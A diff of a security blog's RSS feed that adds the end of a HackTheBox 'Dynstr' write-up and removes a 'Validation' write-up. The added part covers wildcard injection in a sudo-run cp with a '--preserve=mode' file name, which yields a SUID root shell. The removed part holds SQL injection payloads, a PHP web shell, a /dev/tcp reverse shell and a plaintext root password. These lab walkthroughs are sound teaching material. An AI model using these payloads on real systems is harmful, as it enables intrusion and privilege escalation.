+bindmgr@dynstr:~$ id
+<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span>
+</code></pre></div><p>The flag:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bindmgr@dynstr:~$ ls -l
+total <span class="m">8</span>
+drwxr-xr-x <span class="m">2</span> bindmgr bindmgr <span class="m">4096</span> Mar <span class="m">13</span> 14:53 support-case-C62796521
+-r-------- <span class="m">1</span> bindmgr bindmgr   <span class="m">33</span> Jun <span class="m">17</span> 10:51 user.txt
+bindmgr@dynstr:~$ cat user.txt
+6404e...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-2">Enumeration</h4>
+<p>Checking for sudo permissions reveals that <code>bindmgr</code> is allowed to run a script called <code>bindmgr.sh</code> as root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bindmgr@dynstr:~$ sudo -l
+sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
+Matching Defaults entries <span class="k">for</span> bindmgr on dynstr:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User bindmgr may run the following commands on dynstr:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/bindmgr.sh
+</code></pre></div><p>The author gives a well documented about what this script does.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/usr/bin/bash
+</span><span class="cp"></span>
+<span class="c1"># This script generates named.conf.bindmgr to workaround the problem</span>
+<span class="c1"># that bind/named can only include single files but no directories.</span>
+<span class="c1">#</span>
+<span class="c1"># It creates a named.conf.bindmgr file in /etc/bind that can be included</span>
+<span class="c1"># from named.conf.local (or others) and will include all files from the</span>
+<span class="c1"># directory /etc/bin/named.bindmgr.</span>
+<span class="c1">#</span>
+<span class="c1"># NOTE: The script is work in progress. For now bind is not including</span>
+<span class="c1">#       named.conf.bindmgr.</span>
+<span class="c1">#</span>
+<span class="c1"># TODO: Currently the script is only adding files to the directory but</span>
+<span class="c1">#       not deleting them. As we generate the list of files to be included</span>
+<span class="c1">#       from the source directory they won&#39;t be included anyway.</span>
+
+<span class="nv">BINDMGR_CONF</span><span class="o">=</span>/etc/bind/named.conf.bindmgr
+<span class="nv">BINDMGR_DIR</span><span class="o">=</span>/etc/bind/named.bindmgr
+
+indent<span class="o">()</span> <span class="o">{</span> sed <span class="s1">&#39;s/^/    /&#39;</span><span class="p">;</span> <span class="o">}</span>
+
+<span class="c1"># Check versioning (.version)</span>
+<span class="nb">echo</span> <span class="s2">&#34;[+] Running </span><span class="nv">$0</span><span class="s2"> to stage new configuration from </span><span class="nv">$PWD</span><span class="s2">.&#34;</span>
+<span class="k">if</span> <span class="o">[[</span> ! -f .version <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
+    <span class="nb">echo</span> <span class="s2">&#34;[-] ERROR: Check versioning. Exiting.&#34;</span>
+    <span class="nb">exit</span> <span class="m">42</span>
+<span class="k">fi</span>
+<span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;`cat .version 2&gt;/dev/null`&#34;</span> -le <span class="s2">&#34;`cat </span><span class="nv">$BINDMGR_DIR</span><span class="s2">/.version 2&gt;/dev/null`&#34;</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
+    <span class="nb">echo</span> <span class="s2">&#34;[-] ERROR: Check versioning. Exiting.&#34;</span>
+    <span class="nb">exit</span> <span class="m">43</span>
+<span class="k">fi</span>
+
+<span class="c1"># Create config file that includes all files from named.bindmgr.</span>
+<span class="nb">echo</span> <span class="s2">&#34;[+] Creating </span><span class="nv">$BINDMGR_CONF</span><span class="s2"> file.&#34;</span>
+<span class="nb">printf</span> <span class="s1">&#39;// Automatically generated file. Do not modify manually.\n&#39;</span> &gt; <span class="nv">$BINDMGR_CONF</span>
+<span class="k">for</span> file in * <span class="p">;</span> <span class="k">do</span>
+    <span class="nb">printf</span> <span class="s1">&#39;include &#34;/etc/bind/named.bindmgr/%s&#34;;\n&#39;</span> <span class="s2">&#34;</span><span class="nv">$file</span><span class="s2">&#34;</span> &gt;&gt; <span class="nv">$BINDMGR_CONF</span>
+<span class="k">done</span>
+
+<span class="c1"># Stage new version of configuration files.</span>
+<span class="nb">echo</span> <span class="s2">&#34;[+] Staging files to </span><span class="nv">$BINDMGR_DIR</span><span class="s2">.&#34;</span>
+cp .version * /etc/bind/named.bindmgr/
+
+<span class="c1"># Check generated configuration with named-checkconf.</span>
+<span class="nb">echo</span> <span class="s2">&#34;[+] Checking staged configuration.&#34;</span>
+named-checkconf <span class="nv">$BINDMGR_CONF</span> &gt;/dev/null
+<span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> -ne <span class="m">0</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
+    <span class="nb">echo</span> <span class="s2">&#34;[-] ERROR: The generated configuration is not valid. Please fix following errors: &#34;</span>
+    named-checkconf <span class="nv">$BINDMGR_CONF</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> indent
+    <span class="nb">exit</span> <span class="m">44</span>
+<span class="k">else</span>
+    <span class="nb">echo</span> <span class="s2">&#34;[+] Configuration successfully staged.&#34;</span>
+    <span class="c1"># *** TODO *** Uncomment restart once we are live.</span>
+    <span class="c1"># systemctl restart bind9</span>
+    <span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> -ne <span class="m">0</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
+        <span class="nb">echo</span> <span class="s2">&#34;[-] Restart of bind9 via systemctl failed. Please check logfile: &#34;</span>
+        systemctl status bind9
+    <span class="k">else</span>
+        <span class="nb">echo</span> <span class="s2">&#34;[+] Restart of bind9 via systemctl succeeded.&#34;</span>
+    <span class="k">fi</span>
+<span class="k">fi</span>
+</code></pre></div><p>The first two <code>if</code> statement show that the script want a file called <code>.version</code>, and since it looks for the script from <code>$PWD</code>, I can create one in anywhere.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bindmgr@dynstr:~$ <span class="nb">echo</span> <span class="s1">&#39;5&#39;</span> &gt; .version
+</code></pre></div><p>Then when I run the script, it throws the following error.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bindmgr@dynstr:~$ sudo bindmgr.sh
+sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
+<span class="o">[</span>+<span class="o">]</span> Running /usr/local/bin/bindmgr.sh to stage new configuration from /home/bindmgr.
+<span class="o">[</span>+<span class="o">]</span> Creating /etc/bind/named.conf.bindmgr file.
+<span class="o">[</span>+<span class="o">]</span> Staging files to /etc/bind/named.bindmgr.
+cp: -r not specified<span class="p">;</span> omitting directory <span class="s1">&#39;support-case-C62796521&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Checking staged configuration.
+<span class="o">[</span>-<span class="o">]</span> ERROR: The generated configuration is not valid. Please fix following errors:
+    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/support-case-C62796521: file not found
+</code></pre></div><p>And this one is interesting</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">cp: -r not specified<span class="p">;</span> omitting directory <span class="s1">&#39;support-case-C62796521&#39;</span>
+</code></pre></div><p>If I trace it, the error come from these lines.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Stage new version of configuration files.</span>
+<span class="nb">echo</span> <span class="s2">&#34;[+] Staging files to </span><span class="nv">$BINDMGR_DIR</span><span class="s2">.&#34;</span>
+cp .version * /etc/bind/named.bindmgr/
+</code></pre></div><p>According to <a href="https://gtfobins.github.io/gtfobins/cp/.">GTFOBins</a>, using <code>cp</code> with <code>*</code> can lead to wildcard injection.</p>
+<h4 id="exploitation">Exploitation</h4>
+<p>To exploit <code>cp</code> with <code>*</code> (wildcard), I will create a copy of the bash binary and set SUID permissions on it, and then I will create another file with a filename  <code>--preserve=mode</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bindmgr@dynstr:/dev/shm$ <span class="nb">echo</span> <span class="s1">&#39;5&#39;</span> &gt; .version
+bindmgr@dynstr:/dev/shm$ touch  <span class="s1">&#39;--preserve=mode&#39;</span>
+bindmgr@dynstr:/dev/shm$ cp /bin/bash .
+bindmgr@dynstr:/dev/shm$ chmod u+s bash
+bindmgr@dynstr:/dev/shm$ ls -la
+total <span class="m">1164</span>
+drwxrwxrwt  <span class="m">2</span> root    root        <span class="m">100</span> Jun <span class="m">17</span> 15:18  .
+drwxr-xr-x <span class="m">17</span> root    root       <span class="m">3940</span> Jun <span class="m">17</span> 10:51  ..
+-rwsr-sr-x  <span class="m">1</span> bindmgr bindmgr <span class="m">1183448</span> Jun <span class="m">17</span> 15:18  bash
+-rw-rw-r--  <span class="m">1</span> bindmgr bindmgr       <span class="m">1</span> Jun <span class="m">17</span> 15:12 <span class="s1">&#39;--preserve=mode&#39;</span>
+-rw-rw-r--  <span class="m">1</span> bindmgr bindmgr       <span class="m">2</span> Jun <span class="m">17</span> 14:47  .version
+</code></pre></div><p><code>cp</code> will see that <code>--preserve=mode</code> file as name as a flag/option/switch, so it becomes</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ cp .version --preserve<span class="o">=</span>mode /etc/bind/named.bindmgr/
+</code></pre></div><p>When I run <code>bindmgr.sh</code> again, it throws another error.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bindmgr@dynstr:/dev/shm$ sudo bindmgr.sh
+sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
+<span class="o">[</span>+<span class="o">]</span> Running /usr/local/bin/bindmgr.sh to stage new configuration from /dev/shm.
+<span class="o">[</span>+<span class="o">]</span> Creating /etc/bind/named.conf.bindmgr file.
+<span class="o">[</span>+<span class="o">]</span> Staging files to /etc/bind/named.bindmgr.
+<span class="o">[</span>+<span class="o">]</span> Checking staged configuration.
+<span class="o">[</span>-<span class="o">]</span> ERROR: The generated configuration is not valid. Please fix following errors:
+    /etc/bind/named.bindmgr/bash:1: unknown option <span class="s1">&#39;ELF☻☺☺...&#39;</span>
+    /etc/bind/named.bindmgr/bash:14: unknown option <span class="s1">&#39;♥h□ȀE□♣&#39;</span>
+    /etc/bind/named.bindmgr/bash:40: unknown option <span class="s1">&#39;□YF&#39;</span>
+    /etc/bind/named.bindmgr/bash:40: unexpected token near <span class="s1">&#39;}&#39;</span>
+</code></pre></div><p>But now under <code>/etc/bind/named.bindmgr</code>, I have a copy of bash with SUID permissions set to root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bindmgr@dynstr:/dev/shm$ ls -la /etc/bind/named.bindmgr
+total <span class="m">1168</span>
+drwxr-sr-x <span class="m">2</span> root <span class="nb">bind</span>    <span class="m">4096</span> Jun <span class="m">17</span> 15:18 .
+drwxr-sr-x <span class="m">3</span> root <span class="nb">bind</span>    <span class="m">4096</span> Jun <span class="m">17</span> 15:18 ..
+-rwsr-sr-x <span class="m">1</span> root <span class="nb">bind</span> <span class="m">1183448</span> Jun <span class="m">17</span> 15:18 bash
+-rw-rw-r-- <span class="m">1</span> root <span class="nb">bind</span>       <span class="m">2</span> Jun <span class="m">17</span> 15:18 .version
+</code></pre></div><p>Executing that bash with <code>-p</code> gives me a root shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bindmgr@dynstr:/dev/shm$ /etc/bind/named.bindmgr/bash -p
+bash-5.0# id
+<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>117<span class="o">(</span><span class="nb">bind</span><span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>117<span class="o">(</span><span class="nb">bind</span><span class="o">)</span>,1001<span class="o">(</span>bindmgr<span class="o">)</span>
+bash-5.0# whoami
+root
+</code></pre></div><p>The flag</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-5.0# ls -l
+total <span class="m">8</span>
+drwxr-xr-x <span class="m">4</span> root root <span class="m">4096</span> Mar <span class="m">14</span> 14:18 cleanup
+-r-------- <span class="m">1</span> root root   <span class="m">33</span> Jun <span class="m">17</span> 10:51 root.txt
+bash-5.0# cat root.txt
+64348...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div>]]></content:encoded>
+    </item>
+    
     <item>
       <title>HackTheBox - Cap</title>
       <link>https://fahmifj.github.io/hackthebox/cap/</link>
@@ -1533,195 +1981,6 @@ total <span class="m">4</span>
 root@redlike-20edff3e85f553f2-55b895664b-szch7:~# cat flag.txt
 flag<span class="o">{</span>69dc14707af23b728ebd1363715ec890<span class="o">}</span>
 </code></pre></div>]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>HackTheBox - Validation</title>
-      <link>https://fahmifj.github.io/hackthebox/validation/</link>
-      <pubDate>Fri, 24 Sep 2021 19:11:30 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/hackthebox/validation/</guid>
-      <description>Second-order SQL injection</description>
-      <content:encoded><![CDATA[<p><a href="https://app.hackthebox.eu/machines/Validation">Validation</a>  is a machine from the UHC September qualifiers and is currently live on Hack The Box as a retired machine. It starts with enumeration on a website and identifying a second order SQL injection. The SQL user can use various SQL functions, two of which allow for file read and file write. The web configuration, which contains database credentials, can be read using the file read ability. With the file write ability and also write permission on the web root, it is possible to drop a web shell to gain a foothold on the system. For the root part, the password for the database is found to be re-used by the root account.</p>
-<h4 id="skills-learned">Skills Learned</h4>
-<ul>
-<li>Web enumeration</li>
-<li>SQL injection</li>
-</ul>
-<h4 id="tools">Tools</h4>
-<ul>
-<li>Nmap</li>
-<li>Burp Suite</li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p>All TCP ports scan with <code>nmap</code> discovers 4 open ports: SSH on 22, three web servers on 80, 4566 (probably LocalStack), and 8080.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «validation» «10.10.14.5» 
-$ fscan 10.10.11.116 validation
-nmap -p- 10.10.11.116 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
-nmap -p 22,80,4566,5000,5001,5002,5003,5004,5005,5006,5007,5008,8080 -sC -sV -oA nmap/all-tcp-ports-validation 10.10.11.116
-Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-22 16:46 EDT
-Nmap scan report <span class="k">for</span> 10.10.11.116
-Host is up <span class="o">(</span>0.051s latency<span class="o">)</span>.
-
-PORT     STATE    SERVICE        VERSION
-22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-<span class="p">|</span> ssh-hostkey: 
-<span class="p">|</span>   <span class="m">3072</span> d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a <span class="o">(</span>RSA<span class="o">)</span>
-<span class="p">|</span>   <span class="m">256</span> 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 <span class="o">(</span>ECDSA<span class="o">)</span>
-<span class="p">|</span>_  <span class="m">256</span> 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a <span class="o">(</span>ED25519<span class="o">)</span>
-80/tcp   open     http           Apache httpd 2.4.48 <span class="o">((</span>Debian<span class="o">))</span>
-<span class="p">|</span>_http-server-header: Apache/2.4.48 <span class="o">(</span>Debian<span class="o">)</span>
-<span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
-4566/tcp open     http           nginx
-<span class="p">|</span>_http-title: <span class="m">403</span> Forbidden
-5000/tcp filtered upnp
-5001/tcp filtered commplex-link
-5002/tcp filtered rfe
-5003/tcp filtered filemaker
-5004/tcp filtered avt-profile-1
-5005/tcp filtered avt-profile-2
-5006/tcp filtered wsm-server
-5007/tcp filtered wsm-server-ssl
-5008/tcp filtered synapsis-edge
-8080/tcp open     http           nginx
-<span class="p">|</span>_http-title: <span class="m">502</span> Bad Gateway
-Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 16.07 seconds
-</code></pre></div><p>The filtered ports indicate that there are some firewall/IP table rules applied on the machine.</p>
-<h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-80---website">TCP 80 - Website</h3>
-<p>Port 80 presents a registration page of UHC. Adding <code>index.php</code> reveals that it&rsquo;s PHP site.</p>
-<p><div class="img-container"><img src="imgs/image-20210923035321832.png" alt="image-20210923035321832"  /></div>
-</p>
-<p>I can register on it, and it redirects to <code>/account.php</code>. The submitted inputs (country and username) are reflected back here, and this can be an indicator for injection point.</p>
-<p><div class="img-container"><img src="imgs/image-20210923040838459.png" alt="image-20210923040838459"  /></div>
-</p>
-<p>The HTTP request for register, which was previously intercepted using Burp Suite, is as follows:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/index.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
-<span class="n">Host</span><span class="o">:</span> <span class="l">10.10.11.116</span>
-<span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
-<span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
-<span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
-<span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
-<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
-<span class="n">Content-Length</span><span class="o">:</span> <span class="l">35</span>
-<span class="n">Origin</span><span class="o">:</span> <span class="l">http://10.10.11.116</span>
-<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
-<span class="n">Referer</span><span class="o">:</span> <span class="l">http://10.10.11.116/index.php</span>
-<span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
-
-username=choropys&amp;country=Indonesia
-</code></pre></div><p>And the server responses with <code>302</code> which redirects to <code>/account.php</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
-<span class="n">Date</span><span class="o">:</span> <span class="l">Wed, 22 Sep 2021 21:08:19 GMT</span>
-<span class="n">Server</span><span class="o">:</span> <span class="l">Apache/2.4.48 (Debian)</span>
-<span class="n">X-Powered-By</span><span class="o">:</span> <span class="l">PHP/7.4.23</span>
-<span class="n">Set-Cookie</span><span class="o">:</span> <span class="l">user=f1bffe3047f1550d765a66e3ac54515c</span>
-<span class="n">Location</span><span class="o">:</span> <span class="l">/account.php</span>
-<span class="n">Content-Length</span><span class="o">:</span> <span class="l">0</span>
-<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
-<span class="n">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
-</code></pre></div><p>The response also contains a cookie which is <code>md5sum</code> of the username.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «validation» «10.10.14.5» 
-$ <span class="nb">echo</span> -n <span class="s1">&#39;choropys&#39;</span> <span class="p">|</span> md5sum                                                                 
-f1bffe3047f1550d765a66e3ac54515c
-</code></pre></div><h2 id="foothold">Foothold</h2>
-<h3 id="sql-injection">SQL injection</h3>
-<h4 id="detection">Detection</h4>
-<p>I will submit another registration request with the following payload,</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/index.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
-<span class="n">Host</span><span class="o">:</span> <span class="l">10.10.11.116</span>
-
-<span class="g">...[SNIP]...
-</span><span class="g">
-</span><span class="g">username=choropys&#39;&amp;country=Indonesia&#39;
-</span></code></pre></div><p>Now when I navigate to <code>/account.php</code> with updated cookie, the page displays an error message.</p>
-<p><div class="img-container"><img src="imgs/image-20210923041509664.png" alt="image-20210923041509664"  /></div>
-</p>
-<p>If I search for  <code>fetch_assoc()</code> on Google, it&rsquo;s a PHP function that typically used to handle database records.</p>
-<p>Now if I change the <code>country</code>  value to <code>Indonesia' -- #</code> , the page doesn&rsquo;t error out. From here, I can assume that the site is vulnerable to SQL injection.</p>
-<p><div class="img-container"><img src="imgs/image-20210923041604118.png" alt="image-20210923041604118"  /></div>
-</p>
-<p>I will submit <code>country=Indonesia'ORDER BY 1,2 -- #</code> to identify the number of available columns, and the <code>/account.php</code> page returns with the same error.</p>
-<p><div class="img-container"><img src="imgs/image-20210923042953130.png" alt="image-20210923042953130"  /></div>
-</p>
-<p>So the query in the backend only wants a single column.</p>
-<h4 id="leak-source">Leak source</h4>
-<p>I couldn&rsquo;t find any credentials on the database, but I found out that the MySQL <code>load_file()</code> function isn&rsquo;t restricted. I can read the <code>/etc/passwd</code> file using that function.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">username=choropys&amp;country=&#39;UNION SELECT load_file(&#39;/etc/passwd&#39;) -- #
-</code></pre></div><p>When I refresh <code>/account.page</code></p>
-<p><div class="img-container"><img src="imgs/image-20210923043603480.png" alt="image-20210923043603480"  /></div>
-</p>
-<p>Since the location of <code>account.php</code> has been leaked by the error message, I can try to load that file with <code>country='UNION SELECT load_file('/var/www/html/account.php') -- #</code>. When I refresh the <code>account.php</code> page and view its source, the source code of <code>account.php</code> is there, and it also leaks the configuration file.</p>
-<p><div class="img-container"><img src="imgs/image-20210923044030733.png" alt="image-20210923044030733"  /></div>
-</p>
-<p>I can try to read <code>config.php</code> by changing my payload to <code>country='UNION SELECT load_file('/var/www/html/account.php') -- #</code>, and it reveals database credentials.</p>
-<p><div class="img-container"><img src="imgs/image-20210923044108761.png" alt="image-20210923044108761"  /></div>
-</p>
-<p>I will note these creds.</p>
-<h3 id="shell-as-www-data">Shell as www-data</h3>
-<h4 id="web-shell">Web shell</h4>
-<p>I also find that writing files is allowed on <code>/var/www/html/</code>, therefore I could put a web shell there.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">username=choropys&amp;country=&#39;UNION SELECT &#34;&lt;?php system($_REQUEST[c]); ?&gt;&#34; INTO OUTFILE &#34;/var/www/html/chrp.php&#34; -- #	
-</code></pre></div><p>And now I have code execution.</p>
-<p><div class="img-container"><img src="imgs/image-20210923045051661.png" alt="image-20210923045051661"  /></div>
-</p>
-<h4 id="reverse-shell">Reverse Shell</h4>
-<p>The system does have bash, but my reverse shell doesn&rsquo;t work with the GET method, so I changed the request to use the POST method and URL encode the payload.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">c=/bin/bash+-c+&#34;/bin/bash+-i+&gt;%26+/dev/tcp/10.10.14.5/21+0&gt;%261&#34;
-</code></pre></div><p>On my listener</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «validation» «10.10.14.5» 
-$ nc -nvlp <span class="m">21</span>                                                
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">21</span> ...
-connect to <span class="o">[</span>10.10.14.5<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.116<span class="o">]</span> <span class="m">37096</span>
-bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
-bash: no job control in this shell
-www-data@validation:/var/www/html$ id 
-id 
-<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
-</code></pre></div><p>I will upgrade my shell.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/var/www/html$ which script
-which script
-/usr/bin/script
-www-data@validation:/var/www/html$ script /dev/null -c bash
-script /dev/null -c bash
-Script started, output log file is <span class="s1">&#39;/dev/null&#39;</span>.
-www-data@validation:/var/www/html$ ^Z
-<span class="o">[</span>1<span class="o">]</span>  + <span class="m">113</span> suspended  nc -nvlp <span class="m">21</span>
-→ root@kali «exploits» «10.10.14.49» 
-$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
-<span class="o">[</span>1<span class="o">]</span>  + <span class="m">113</span> continued  nc -nvlp <span class="m">21</span>
-
-www-data@validation:/var/www/html$ 
-</code></pre></div><p>The root flag is readable by others, so I could grab it.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/home/htb$ ls -lR /home
-/home:
-total <span class="m">4</span>
-drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Sep <span class="m">9</span> 12:09 htb
-
-/home/htb:
-total <span class="m">4</span>
--rw-r--r-- <span class="m">2</span> root root <span class="m">33</span> Sep <span class="m">22</span> 22:14 user.txt
-</code></pre></div><p>I also noticed that I&rsquo;m inside a Docker container because there is <code>.dockerenv</code> at the root file system</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/$ ls -l .dockerenv
--rwxr-xr-x <span class="m">2</span> root root <span class="m">0</span> Sep <span class="m">16</span> 13:39 .dockerenv
-</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as-root">Shell as root</h3>
-<h4 id="su-root">su root</h4>
-<p>In the previous enumeration using SQLi, I didn&rsquo;t see user <strong>htb</strong> listed in the <code>/etc/passwd</code> file, and it&rsquo;s only <strong>root</strong> that has a login shell. So I tried the database password I obtained from the <code>config.php</code> file on <strong>root</strong>, and it worked.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/$ su -   
-su -
-Password: uhc-9qual-global-pw
-
-root@validation:~# 
-</code></pre></div><p>I thought I needed to escape from this container, but when I checked the <code>/root/</code> directory, the root flag was there.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@validation:/# ls -l /root/root.txt 
--r-------- <span class="m">2</span> root root <span class="m">33</span> Sep <span class="m">22</span> 22:14 root.txt
-</code></pre></div><p>I also briefly thought that maybe a player had left a copy of the root flag of the host in this container. But, after I watched the <a href="https://www.youtube.com/watch?v=UqoVQ4dbYaI">official walkthrough</a> video by ippsec and read the <a href="https://0xdf.gitlab.io/2021/09/14/htb-validation.html">writeup</a> by 0xdf, the box ended this way 😅.</p>
-]]></content:encoded>
     </item>
     
   </channel>
